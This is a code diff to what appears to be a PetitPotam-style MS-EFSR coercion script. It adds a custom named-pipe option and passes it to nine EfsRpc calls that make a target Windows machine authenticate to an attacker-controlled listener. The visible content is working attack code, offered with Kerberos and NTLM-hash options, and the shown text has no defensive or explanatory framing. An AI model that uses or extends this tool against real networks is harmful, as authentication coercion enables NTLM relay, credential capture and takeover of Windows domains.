@@ -28,12 +28,13 @@ if __name__ == '__main__':
     parser.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line")
     parser.add_argument("--dc-ip", action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
     parser.add_argument("--target-ip", action="store", metavar="ip address", help="IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it")
+    parser.add_argument("-n","--namedpipe", default="coerced", help="Specify the custom name of the NamedPipe (ex: c0erc3d)")
 
     parser.add_argument("listener", help="IP address or hostname of listener")
     parser.add_argument("target", help="IP address or hostname of target")
 
     options = parser.parse_args()
-
+    
     if options.hashes is not None:
         lmhash, nthash = options.hashes.split(':')
     else:
@@ -59,14 +60,14 @@ if __name__ == '__main__':
     )
 
     if connected:
-        protocol.EfsRpcEncryptFileSrv(options.listener)
-        protocol.EfsRpcDecryptFileSrv(options.listener)
-        protocol.EfsRpcQueryUsersOnFile(options.listener)
-        protocol.EfsRpcQueryRecoveryAgents(options.listener)
-        protocol.EfsRpcFileKeyInfo(options.listener)
-        protocol.EfsRpcDuplicateEncryptionInfoFile(options.listener)
-        protocol.EfsRpcFileKeyInfoEx(options.listener) #Don't work for now (rpc_x_bad_stub_data)
-        protocol.EfsRpcAddUsersToFileEx(options.listener) #Don't work for now (rpc_x_bad_stub_data)
-        protocol.EfsRpcFileKeyInfoEx(options.listener) #Don't work for now (rpc_x_bad_stub_data)
+        protocol.EfsRpcEncryptFileSrv(options.listener,options.namedpipe)
+        protocol.EfsRpcDecryptFileSrv(options.listener,options.namedpipe)
+        protocol.EfsRpcQueryUsersOnFile(options.listener,options.namedpipe)
+        protocol.EfsRpcQueryRecoveryAgents(options.listener,options.namedpipe)
+        protocol.EfsRpcFileKeyInfo(options.listener,options.namedpipe)
+        protocol.EfsRpcDuplicateEncryptionInfoFile(options.listener,options.namedpipe)
+        protocol.EfsRpcFileKeyInfoEx(options.listener,options.namedpipe) #Don't work for now (rpc_x_bad_stub_data)
+        protocol.EfsRpcAddUsersToFileEx(options.listener,options.namedpipe) #Don't work for now (rpc_x_bad_stub_data)
+        protocol.EfsRpcFileKeyInfoEx(options.listener,options.namedpipe) #Don't work for now (rpc_x_bad_stub_data)
         
     sys.exit()
